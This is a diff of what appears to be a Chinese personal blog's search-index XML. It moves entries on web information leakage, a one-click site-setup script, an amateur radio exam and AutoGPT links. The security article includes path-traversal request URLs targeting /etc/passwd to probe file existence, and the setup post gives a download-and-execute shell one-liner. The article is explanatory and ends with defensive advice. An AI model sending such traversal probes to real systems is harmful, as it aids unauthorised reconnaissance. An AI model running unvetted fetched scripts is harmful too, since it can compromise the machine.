@@ -61,90 +61,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Web应用中的信息泄漏以及攻击方法</title>
-    <url>/2023/07/22/Web%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
-<span id="more"></span>
-
-<p><strong>Banner收集&#x2F;主动侦查</strong></p>
-<p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
-<p>在大多数情况下，Banner收集并不会涉及关键信息泄漏，不过可以让攻击者收集到开发过程中使用环境版本的信息。例如：如果目标在服务器上面使用的是php旧版本，由于没有更新，所以攻击者可以利用已知的漏洞攻击，也许会出现远程命令执行&#x2F;代码执行的漏洞。</p>
-<p>Banner信息收集举例：</p>
-<p>Nmap scan report for example.com (x.x.x.x)</p>
-<p>Host is up (0.037s latency).</p>
-<p>Not shown: 999 filtered ports</p>
-<p>PORT STATE SERVICE VERSION</p>
-<p>22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)</p>
-<p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
-<p>在上面例子中，我们使用Nmap扫描器对目标进行端口扫描。结果表明目标开启了22端口，并且OpenSSH版本号是5.9p1。也许这个版本就存在可以被攻击者利用的漏洞。</p>
-<p><strong>源码泄漏</strong></p>
-<p>当Web应用程序的后端环境代码暴露给不涉及应用程序开发的用户时，会发生源代码泄露问题。源代码泄露使攻击者能够通过读取代码和检查逻辑缺陷，以及查看硬编码的用户名&#x2F;密码对或者API密钥来发现这个应用程序的不足以及漏洞。</p>
-<p>漏洞的严重性取决于泄漏源码的多少，以及代码在应用程序中的重要性。总而言之，因为攻击者可以查看源代码，所以很大程度上将渗透测试由黑盒转向白盒。事实上，有很多错误能够导致源码泄漏的漏洞发生，下面这几种错误就包含在其中：</p>
-<p><strong>代码库未受保护</strong></p>
-<p>为了更加方便的管理站点，大多数站点都会把他们源码上传到云端。这些项目有时会管理不当，攻击者能够直接访问网站源码和网站信息。并且，有些公司将他们的开源软件项目放到了github上面，这样公共用户可以对这个项目作出改进。这种情况下，源码已经是公开的，但是这种情况下泄漏公司重要信息已经是很常见了。</p>
-<p>实例：</p>
-<p>有些源码库只允许使用第三方帐号进行登录并且符合身份认证的用户查看源码代码。这些源码库有时候配置错误，没有严格控制查看内容的权限，导致任何人都可以查看源码内容。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-28.png" alt="图片"></p>
-<p><strong>源代码中存在敏感信息</strong></p>
-<p>另一个例子是当公共代码具有硬编码的敏感信息时，例如用户凭证或API密钥。攻击者可以轻松地使用这些信息来破坏这些服务，或者可以使用合法账户进行登录。在信息披露期间通常泄漏的另一条信息是内部IP地址，允许攻击者识别和了解内部网络拓扑，然后可以将这样的信息用于攻击内部服务中，例如服务器端请求伪造（SSRF）攻击来攻击多个系统。</p>
-<p><strong>MIME类型不正确</strong></p>
-<p>浏览器通过HTTP包头中的Content-Type内容来确定如何解析HTTP服务器响应返回的内容。举个例子，我们想让浏览器将html文件解析，而不是只是纯文本文件。再比如我们想让浏览器下载一个zip，而不是解析这个zip文件。</p>
-<p>如果web服务器的配置错误，那么就会出现这样的错误：当我们访问html时候，Conten-Type会是:text&#x2F;plain,而不是text&#x2F;html，并且html文件会以纯文档的形式展现给浏览器。因此&lt;&#x2F;&gt;还有一些其他字符都会在页面上显示出来。下面图片是展示当页面访问时服务器设置的Content-Type响应头。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-29.png" alt="图片"></p>
-<p>当Web应用程序无法为其中包含源代码的网页发送适当的Content-Type头部时，可能会发生信息泄露问题，并且最终以纯文本形式呈现信息，并披露有关Web应用程序的有价值信息。</p>
-<p><strong>实例</strong>：</p>
-<p>我们假设一个Web服务器用于运行一个PHP</p>
-<p>Web应用程序，但现在运行一个ASP.NET。以前由旧的Web应用程序使用并具有敏感信息（如MySQL数据库凭据）的PHP脚本正在被用户访问。如果PHP没有在Web服务器上运行和配置，则Content-Type将从HTTP响应中省略，并且PHP脚本将被解释为纯文本或HTML标记，具体取决于Web浏览器，然后就会泄露里面包含的所有信息。</p>
-<p>下面屏幕截图就展示了即使服务器返回头没有设置Content-Type，火狐浏览器还是将php脚本解析成了HTML。我们需要在查看源代码中看到脚本信息。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-30.png" alt="图片"></p>
-<p>下面截图展示了chrome浏览器直接返回了纯文本的文件，所以我们可以直接看到源码。</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-31.png" alt="图片"></p>
-<p><strong>处理敏感信息不当</strong></p>
-<p>另一种常见的信息泄漏是由硬编码的账户名和密码以及内部ip在代码的注释中泄漏。在大多数情况下，这些敏感信息在访问web页面时会展现出来。这些敏感信息的泄漏也可能会导致web应用程序遭受攻击。攻击者只需要右键页面查看网页源代码，就可以找到这些注释。如果在发现web应用程序存在这种问题，Netsparker将会提醒您。</p>
-<p><strong>缺少认证机制或者认证机制配置不当</strong></p>
-<p>在Web应用程序权限设置不正确，不完整或甚至缺少授权检查可能会允许攻击者访问敏感信息或未授权访问登录用户的信息。这些问题很常见，它们也列在OWASP十大最常见和利用漏洞的列表中。</p>
-<p>示例：<a href="https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/">https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/</a></p>
-<p>一个真实的权限控制不当，导致被拿shell的案例。</p>
-<p><strong>文件名或者文件路径泄漏</strong></p>
-<p>在某些情况下，Web应用程序可以公开文件名或文件路径，从而显示关于底层系统结构的信息。这可能是由于用户输入的不正确处理，后端的异常或Web服务器的不当配置。有时可以在Web应用程序，错误页面，调试信息等的响应中找到或标识这些信息。</p>
-<p>示例：</p>
-<p>攻击者可以通过发送访问请求来检查Web应用程序是否公开任何文件名或路径。例如，当发送以下请求时，Web应用程序返回403（禁止）响应：</p>
-<p><a href="https://www.example.com/etc/passwd">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</a></p>
-<p>但是当攻击者发送下面请求时，web应用程序返回404（没有文件）的响应：</p>
-<p><a href="https://www.example.com/etc/doesntexist">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/doesntexist</a></p>
-<p>由于第一次请求，攻击者得到了403 Forbidden错误，而对于第二个请求，他得到了404 Not Found，他知道在第一种情况下，该文件存在。因此，攻击者可以利用Web应用程序的行为，了解服务器的结构以及验证系统上是否存在某个文件夹或文件。</p>
-<p><strong>目录遍历</strong></p>
-<p>文件名和路径公开相关的是Web服务器中的目录显示功能。此功能在Web服务器上默认提供。当没有默认网页时，在网站上显示Web服务器显示用户列表中的文件和目录。</p>
-<p>因此，在apahce服务器上面默认文件名为Index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。如下图：</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-32.png" alt="图片"></p>
-<p>使用这样一个模块会使服务器产生很大的安全隐患。</p>
-<p>实例：</p>
-<p>现在很多人都知道这样的功能应该被禁用，所以看到它并不常见。虽然我们假设扫描Web服务器的端口后，攻击者发现在8081端口运行的Web服务器的默认启动此功能。</p>
-<p>这样的“默认值”通常被Web服务器管理员忽略，这也意味着它们不太安全。它会允许攻击者浏览目录并访问Web应用程序的源代码，备份和可能的数据库文件。</p>
-<p><strong>防止信息泄漏应该注意的事项</strong></p>
-<p>信息泄漏问题似乎是一件小事情，但对攻击者来说是非常有价值的。它们允许攻击者通过执行基本测试，有时只需在公共页面中查找信息，获得有关攻击目标的非常有用的信息。</p>
-<p>事实上，Netsparker在扫描目标网站时会报告知识库节点中可能的信息披露和其他类似的安全问题。你应该解决这些问题，特别是当你认为它们很容易修复时。以下是遵循的一些指导方针，以便您可以确保您的Web应用程序受到良好保护：</p>
-<ol>
-<li>确保您的Web服务器不发送显示有关后端技术类型或版本信息的响应头。</li>
-<li>确保服务器打开的端口上运行的所有服务都不会显示有关其构建和版本的信息。</li>
-<li>确保所有目录的访问权限正确，保证不会让攻击者访问到你的所有文件。</li>
-<li>不要在代码中将账户密码硬编码进去。也不要在注释中写入相关信息。</li>
-<li>在web服务器中为所有类型的应用程序配置MIME信息</li>
-<li>不需要上传到网站上的敏感信息永远都不要上传</li>
-<li>始终检查每个创建&#x2F;编辑&#x2F;查看&#x2F;删除资源的请求是否具有适当的访问控制，防止越权访问，并确保所有机密信息保密。</li>
-<li>确保您的Web应用程序正确处理用户输入，并且始终为所有不存在&#x2F;不允许的资源返回通用响应，以便混淆攻击者。</li>
-<li>后端代码应该考虑到所有情况，并且当异常发生时，能够保证信息不被泄漏。</li>
-<li>配置Web服务器以禁止目录遍历，并确保Web应用程序始终显示默认网页。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>OWASP TOP 10漏洞介绍</title>
     <url>/2023/07/21/OWASP-TOP-10%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>OWASP项目最具权威的就是其“十大安全漏洞列表”,这个列表总结了Web应用程序最可能、最常见、最危险的十大漏洞</p>
@@ -280,20 +196,123 @@
       </tags>
   </entry>
   <entry>
-    <title>一试报名记 ·业余无线电</title>
-    <url>/2025/07/09/%E4%B8%80%E8%AF%95%E6%8A%A5%E5%90%8D%E8%AE%B0%20%C2%B7%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span>
+    <title>一键脚本建站</title>
+    <url>/2023/08/13/%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC%E5%BB%BA%E7%AB%99/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一键脚本上线！内置LDNMP建站脚本！</p>
+<span id="more"></span>
 
-<p>众所周知，余乃一科技玩家，素喜折腾诸般新物，常游于哔哩哔哩之间，搜奇览异，乐此不疲。岁在癸卯，至十一月间，偶见无线电之视频，甚觉有趣，遂起研之之念。旋即下载智谱，稍加探究，愈发沉迷其中。然欲涉此道，首需取证，于是萌发报考之志。</p>
-<p>余欲报某试，然寻我省之报名信息不得。嗟乎！身为学子，家资有限，时亦不裕，不能远赴他省，实为憾事。望榜兴叹，意郁于怀。心虽切切，事不由人，真可谓苦矣！</p>
-<p>忽于仲夏之初，偶览智谱，得吾省将开考之讯，欣然若狂，拍案而起，喜不自胜。自是日起，余即整装图之，下载所用软件，勤加操演，题库穷尽，手不停键，昼夜不辍。心之所系，志在必中。</p>
-<p>临近六月，心愈忐忑。六月朔夜，早早就寝，愿以安神养气，以待次晨之报名。至二日鸡鸣之际，余即披衣起，盥洗毕，坐于案前，开机登入，时为八时三十分。然天不随人愿，至八时五十分，忽觉页面无常，重载之，账号竟被迫下线。</p>
-<p>余未以为意，复试之，网络迟滞，终不得通。及至九时，系统忽崩，页面停滞，万籁俱寂，尝试多次，皆无应答，心乱如麻，几欲弃之。然未几，系统渐苏，页面再启，如见曙光于浓云之隙。余急登入，执键如飞，报名终得成功！</p>
-<p>欣然之情，难以言表，喜极而泣，若释重负。回首前忧，皆成过眼云烟。</p>
-<p>至六月十四日，启程赴试，忽天降大雨，风狂水急，然幸有友台相助，载余同行，未沾片雨，感恩铭心。至考场，久候方入，坐于机前，手执鼠标，审题作答，心明神定，指点如飞。凡题所至，皆应如流。试毕而出，得满分焉，喜不自胜，数月之功，一朝圆矣！</p>
-<p>六月十八日，操作证号下，欣然设台，旋即准备申请。二十日提交相关材料，二十三日核证既成，余遂得呼号 BH3RYU，志气高扬，如愿以偿。自此，身入无线之门，志在连通四海，追风逐电，发声于空中万里之外。</p>
-<p>新人报道，愿与众台共学共进，敬祈多多指教，无吝赐教是幸！</p>
+<p>安装下载工具</p>
+<p>如果没有安装，则可以使用<code>yum</code>命令进行安装，命令格式如下：</p>
+<pre><code class="text">yum -y install wget
+</code></pre>
+<p>这里的参数<code>-y</code>表对对于安装软件包之前的任何提示进行确认，相当于如果询问你“是否****[y&#x2F;n]”，你默认选择<code>y</code>。</p>
+<p>如果您使用的是其他的发行版例如<a href="https://link.zhihu.com/?target=https://linux265.com/distro/45.html">Ubuntu</a>，<a href="https://link.zhihu.com/?target=https://linux265.com/distro/10.html">Debian</a>，一般系统默认安装有wget命令，如果没有安装可以通过以下命令安装。</p>
+<pre><code class="text">sudo apt install wget
+</code></pre>
+<p><strong>一键脚本</strong></p>
+<pre><code>wget https://blog.alone-hk.cn//Download/kejilion.sh &amp;&amp; chmod +x kejilion.sh &amp;&amp; ./kejilion.sh
+</code></pre>
+<p>若以上地址你无法使用请尝试</p>
+<pre><code>wget https://blog.alone-hk.cn//Download/kejilion.sh &amp;&amp; chmod +x kejilion.sh &amp;&amp; ./kejilion.sh
+</code></pre>
+<p>脚本展示图</p>
+<p><a href="https://s1.ax1x.com/2023/08/13/pPufa9K.png"><img src="https://s1.ax1x.com/2023/08/13/pPufa9K.png" alt="img"></a></p>
+<p>目前只支持Ubuntu和Debian系统，暂不支持其它系统！</p>
+<p>此脚本目前比较基础，会不断进化，整合大家常用的脚本。方便使用。</p>
+<p>LDNMP属于原创内容，建站更方便。</p>
 ]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>建站</tag>
+        <tag>warp</tag>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web应用中的信息泄漏以及攻击方法</title>
+    <url>/2023/07/22/Web%E5%BA%94%E7%94%A8%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
+<span id="more"></span>
+
+<p><strong>Banner收集&#x2F;主动侦查</strong></p>
+<p>Banner收集或主动侦察是一种攻击类型，攻击者在此期间向他们的目标系统发送请求，以收集有关它的更多信息。如果系统配置不当，可能会泄漏自己的信息，如服务器版本，PHP或者ASP.NET版本，OpenSSH版本等。</p>
+<p>在大多数情况下，Banner收集并不会涉及关键信息泄漏，不过可以让攻击者收集到开发过程中使用环境版本的信息。例如：如果目标在服务器上面使用的是php旧版本，由于没有更新，所以攻击者可以利用已知的漏洞攻击，也许会出现远程命令执行&#x2F;代码执行的漏洞。</p>
+<p>Banner信息收集举例：</p>
+<p>Nmap scan report for example.com (x.x.x.x)</p>
+<p>Host is up (0.037s latency).</p>
+<p>Not shown: 999 filtered ports</p>
+<p>PORT STATE SERVICE VERSION</p>
+<p>22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)</p>
+<p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
+<p>在上面例子中，我们使用Nmap扫描器对目标进行端口扫描。结果表明目标开启了22端口，并且OpenSSH版本号是5.9p1。也许这个版本就存在可以被攻击者利用的漏洞。</p>
+<p><strong>源码泄漏</strong></p>
+<p>当Web应用程序的后端环境代码暴露给不涉及应用程序开发的用户时，会发生源代码泄露问题。源代码泄露使攻击者能够通过读取代码和检查逻辑缺陷，以及查看硬编码的用户名&#x2F;密码对或者API密钥来发现这个应用程序的不足以及漏洞。</p>
+<p>漏洞的严重性取决于泄漏源码的多少，以及代码在应用程序中的重要性。总而言之，因为攻击者可以查看源代码，所以很大程度上将渗透测试由黑盒转向白盒。事实上，有很多错误能够导致源码泄漏的漏洞发生，下面这几种错误就包含在其中：</p>
+<p><strong>代码库未受保护</strong></p>
+<p>为了更加方便的管理站点，大多数站点都会把他们源码上传到云端。这些项目有时会管理不当，攻击者能够直接访问网站源码和网站信息。并且，有些公司将他们的开源软件项目放到了github上面，这样公共用户可以对这个项目作出改进。这种情况下，源码已经是公开的，但是这种情况下泄漏公司重要信息已经是很常见了。</p>
+<p>实例：</p>
+<p>有些源码库只允许使用第三方帐号进行登录并且符合身份认证的用户查看源码代码。这些源码库有时候配置错误，没有严格控制查看内容的权限，导致任何人都可以查看源码内容。</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-28.png" alt="图片"></p>
+<p><strong>源代码中存在敏感信息</strong></p>
+<p>另一个例子是当公共代码具有硬编码的敏感信息时，例如用户凭证或API密钥。攻击者可以轻松地使用这些信息来破坏这些服务，或者可以使用合法账户进行登录。在信息披露期间通常泄漏的另一条信息是内部IP地址，允许攻击者识别和了解内部网络拓扑，然后可以将这样的信息用于攻击内部服务中，例如服务器端请求伪造（SSRF）攻击来攻击多个系统。</p>
+<p><strong>MIME类型不正确</strong></p>
+<p>浏览器通过HTTP包头中的Content-Type内容来确定如何解析HTTP服务器响应返回的内容。举个例子，我们想让浏览器将html文件解析，而不是只是纯文本文件。再比如我们想让浏览器下载一个zip，而不是解析这个zip文件。</p>
+<p>如果web服务器的配置错误，那么就会出现这样的错误：当我们访问html时候，Conten-Type会是:text&#x2F;plain,而不是text&#x2F;html，并且html文件会以纯文档的形式展现给浏览器。因此&lt;&#x2F;&gt;还有一些其他字符都会在页面上显示出来。下面图片是展示当页面访问时服务器设置的Content-Type响应头。</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-29.png" alt="图片"></p>
+<p>当Web应用程序无法为其中包含源代码的网页发送适当的Content-Type头部时，可能会发生信息泄露问题，并且最终以纯文本形式呈现信息，并披露有关Web应用程序的有价值信息。</p>
+<p><strong>实例</strong>：</p>
+<p>我们假设一个Web服务器用于运行一个PHP</p>
+<p>Web应用程序，但现在运行一个ASP.NET。以前由旧的Web应用程序使用并具有敏感信息（如MySQL数据库凭据）的PHP脚本正在被用户访问。如果PHP没有在Web服务器上运行和配置，则Content-Type将从HTTP响应中省略，并且PHP脚本将被解释为纯文本或HTML标记，具体取决于Web浏览器，然后就会泄露里面包含的所有信息。</p>
+<p>下面屏幕截图就展示了即使服务器返回头没有设置Content-Type，火狐浏览器还是将php脚本解析成了HTML。我们需要在查看源代码中看到脚本信息。</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-30.png" alt="图片"></p>
+<p>下面截图展示了chrome浏览器直接返回了纯文本的文件，所以我们可以直接看到源码。</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-31.png" alt="图片"></p>
+<p><strong>处理敏感信息不当</strong></p>
+<p>另一种常见的信息泄漏是由硬编码的账户名和密码以及内部ip在代码的注释中泄漏。在大多数情况下，这些敏感信息在访问web页面时会展现出来。这些敏感信息的泄漏也可能会导致web应用程序遭受攻击。攻击者只需要右键页面查看网页源代码，就可以找到这些注释。如果在发现web应用程序存在这种问题，Netsparker将会提醒您。</p>
+<p><strong>缺少认证机制或者认证机制配置不当</strong></p>
+<p>在Web应用程序权限设置不正确，不完整或甚至缺少授权检查可能会允许攻击者访问敏感信息或未授权访问登录用户的信息。这些问题很常见，它们也列在OWASP十大最常见和利用漏洞的列表中。</p>
+<p>示例：<a href="https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/">https://www.netsparker.com/blog/web-security/missing-function-level-access-control-vulnerability-maian-support-helpdesk/</a></p>
+<p>一个真实的权限控制不当，导致被拿shell的案例。</p>
+<p><strong>文件名或者文件路径泄漏</strong></p>
+<p>在某些情况下，Web应用程序可以公开文件名或文件路径，从而显示关于底层系统结构的信息。这可能是由于用户输入的不正确处理，后端的异常或Web服务器的不当配置。有时可以在Web应用程序，错误页面，调试信息等的响应中找到或标识这些信息。</p>
+<p>示例：</p>
+<p>攻击者可以通过发送访问请求来检查Web应用程序是否公开任何文件名或路径。例如，当发送以下请求时，Web应用程序返回403（禁止）响应：</p>
+<p><a href="https://www.example.com/etc/passwd">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</a></p>
+<p>但是当攻击者发送下面请求时，web应用程序返回404（没有文件）的响应：</p>
+<p><a href="https://www.example.com/etc/doesntexist">https://www.example.com/%5C../%5C../%5C../%5C../%5C../%5C../etc/doesntexist</a></p>
+<p>由于第一次请求，攻击者得到了403 Forbidden错误，而对于第二个请求，他得到了404 Not Found，他知道在第一种情况下，该文件存在。因此，攻击者可以利用Web应用程序的行为，了解服务器的结构以及验证系统上是否存在某个文件夹或文件。</p>
+<p><strong>目录遍历</strong></p>
+<p>文件名和路径公开相关的是Web服务器中的目录显示功能。此功能在Web服务器上默认提供。当没有默认网页时，在网站上显示Web服务器显示用户列表中的文件和目录。</p>
+<p>因此，在apahce服务器上面默认文件名为Index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。如下图：</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-32.png" alt="图片"></p>
+<p>使用这样一个模块会使服务器产生很大的安全隐患。</p>
+<p>实例：</p>
+<p>现在很多人都知道这样的功能应该被禁用，所以看到它并不常见。虽然我们假设扫描Web服务器的端口后，攻击者发现在8081端口运行的Web服务器的默认启动此功能。</p>
+<p>这样的“默认值”通常被Web服务器管理员忽略，这也意味着它们不太安全。它会允许攻击者浏览目录并访问Web应用程序的源代码，备份和可能的数据库文件。</p>
+<p><strong>防止信息泄漏应该注意的事项</strong></p>
+<p>信息泄漏问题似乎是一件小事情，但对攻击者来说是非常有价值的。它们允许攻击者通过执行基本测试，有时只需在公共页面中查找信息，获得有关攻击目标的非常有用的信息。</p>
+<p>事实上，Netsparker在扫描目标网站时会报告知识库节点中可能的信息披露和其他类似的安全问题。你应该解决这些问题，特别是当你认为它们很容易修复时。以下是遵循的一些指导方针，以便您可以确保您的Web应用程序受到良好保护：</p>
+<ol>
+<li>确保您的Web服务器不发送显示有关后端技术类型或版本信息的响应头。</li>
+<li>确保服务器打开的端口上运行的所有服务都不会显示有关其构建和版本的信息。</li>
+<li>确保所有目录的访问权限正确，保证不会让攻击者访问到你的所有文件。</li>
+<li>不要在代码中将账户密码硬编码进去。也不要在注释中写入相关信息。</li>
+<li>在web服务器中为所有类型的应用程序配置MIME信息</li>
+<li>不需要上传到网站上的敏感信息永远都不要上传</li>
+<li>始终检查每个创建&#x2F;编辑&#x2F;查看&#x2F;删除资源的请求是否具有适当的访问控制，防止越权访问，并确保所有机密信息保密。</li>
+<li>确保您的Web应用程序正确处理用户输入，并且始终为所有不存在&#x2F;不允许的资源返回通用响应，以便混淆攻击者。</li>
+<li>后端代码应该考虑到所有情况，并且当异常发生时，能够保证信息不被泄漏。</li>
+<li>配置Web服务器以禁止目录遍历，并确保Web应用程序始终显示默认网页。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+      </tags>
   </entry>
   <entry>
     <title>node-npm,yarn和pnpm区别</title>
@@ -402,60 +421,21 @@
       </tags>
   </entry>
   <entry>
-    <title>什么是全自动 AI？AutoGPT 安装部署使用教程</title>
-    <url>/2023/07/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%A8%E8%87%AA%E5%8A%A8-AI%EF%BC%9F/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>AutoGPT 安装部署使用教程</p>
+    <title>一试报名记 ·业余无线电</title>
+    <url>/2025/07/09/%E4%B8%80%E8%AF%95%E6%8A%A5%E5%90%8D%E8%AE%B0%20%C2%B7%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我是科技玩家，2024年11月在B站看到无线电视频后，开始了解并下载了智谱。<br> 2025年6月成功报名并通过省内操作证考试，考试当天遇雨幸得友人相助，最终满分通过。<br> 随后设台，取得呼号 <strong>BH3RYU</strong>，正式成为业余无线电爱好者。<br> 期待在电波世界结识更多朋友！</p>
 <span id="more"></span>
 
-<p>视频教程:</p>
-<p>AgentGPT: <a href="https://agentgpt.reworkd.ai/">https://agentgpt.reworkd.ai/</a></p>
-<p>AutoGPT 安装指令: <a href="https://github.com/Significant-Gravitas/Auto-GPT">https://github.com/Significant-Gravitas/Auto-GPT</a></p>
-<p>OpenAI API Key: <a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
-<p>Pinecone API Key: <a href="https://app.pinecone.io/organizations">https://app.pinecone.io/organizations</a></p>
+<p>众所周知，余乃一科技玩家，素喜折腾诸般新物，常游于哔哩哔哩之间，搜奇览异，乐此不疲。岁在癸卯，至十一月间，偶见无线电之视频，甚觉有趣，遂起研之之念。旋即下载智谱，稍加探究，愈发沉迷其中。然欲涉此道，首需取证，于是萌发报考之志。</p>
+<p>余欲报某试，然寻我省之报名信息不得。嗟乎！身为学子，家资有限，时亦不裕，不能远赴他省，实为憾事。望榜兴叹，意郁于怀。心虽切切，事不由人，真可谓苦矣！</p>
+<p>忽于仲夏之初，偶览智谱，得吾省将开考之讯，欣然若狂，拍案而起，喜不自胜。自是日起，余即整装图之，下载所用软件，勤加操演，题库穷尽，手不停键，昼夜不辍。心之所系，志在必中。</p>
+<p>临近六月，心愈忐忑。六月朔夜，早早就寝，愿以安神养气，以待次晨之报名。至二日鸡鸣之际，余即披衣起，盥洗毕，坐于案前，开机登入，时为八时三十分。然天不随人愿，至八时五十分，忽觉页面无常，重载之，账号竟被迫下线。</p>
+<p>余未以为意，复试之，网络迟滞，终不得通。及至九时，系统忽崩，页面停滞，万籁俱寂，尝试多次，皆无应答，心乱如麻，几欲弃之。然未几，系统渐苏，页面再启，如见曙光于浓云之隙。余急登入，执键如飞，报名终得成功！</p>
+<p>欣然之情，难以言表，喜极而泣，若释重负。回首前忧，皆成过眼云烟。</p>
+<p>至六月十四日，启程赴试，忽天降大雨，风狂水急，然幸有友台相助，载余同行，未沾片雨，感恩铭心。至考场，久候方入，坐于机前，手执鼠标，审题作答，心明神定，指点如飞。凡题所至，皆应如流。试毕而出，得满分焉，喜不自胜，数月之功，一朝圆矣！</p>
+<p>六月十八日，操作证号下，欣然设台，旋即准备申请。二十日提交相关材料，二十三日核证既成，余遂得呼号 BH3RYU，志气高扬，如愿以偿。自此，身入无线之门，志在连通四海，追风逐电，发声于空中万里之外。</p>
+<p>新人报道，愿与众台共学共进，敬祈多多指教，无吝赐教是幸！</p>
 ]]></content>
-      <categories>
-        <category>实用分享</category>
-      </categories>
-      <tags>
-        <tag>ai</tag>
-        <tag>AutoGPT</tag>
-        <tag>人工智能</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一键脚本建站</title>
-    <url>/2023/08/13/%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC%E5%BB%BA%E7%AB%99/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一键脚本上线！内置LDNMP建站脚本！</p>
-<span id="more"></span>
-
-<p>安装下载工具</p>
-<p>如果没有安装，则可以使用<code>yum</code>命令进行安装，命令格式如下：</p>
-<pre><code class="text">yum -y install wget
-</code></pre>
-<p>这里的参数<code>-y</code>表对对于安装软件包之前的任何提示进行确认，相当于如果询问你“是否****[y&#x2F;n]”，你默认选择<code>y</code>。</p>
-<p>如果您使用的是其他的发行版例如<a href="https://link.zhihu.com/?target=https://linux265.com/distro/45.html">Ubuntu</a>，<a href="https://link.zhihu.com/?target=https://linux265.com/distro/10.html">Debian</a>，一般系统默认安装有wget命令，如果没有安装可以通过以下命令安装。</p>
-<pre><code class="text">sudo apt install wget
-</code></pre>
-<p><strong>一键脚本</strong></p>
